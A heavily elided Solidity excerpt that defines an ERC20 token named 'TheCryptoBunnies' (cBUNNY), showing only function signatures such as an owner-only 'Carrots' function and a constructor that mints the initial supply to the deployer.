...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _launchTheBunnies(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function Carrots(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Bunnies is Context, ERC20 {
    constructor(
        ...
        _launchTheBunnies(owner, initialSupply, tmp6, tmp7);
    }
}

contract TheCryptoBunnies is ERC20Bunnies {
    constructor() ERC20Bunnies("TheCryptoBunnies", "cBUNNY", false, true, 800, 25, msg.sender, 50000000000 * 10 ** 18, msg.sender, 6) {
    }
}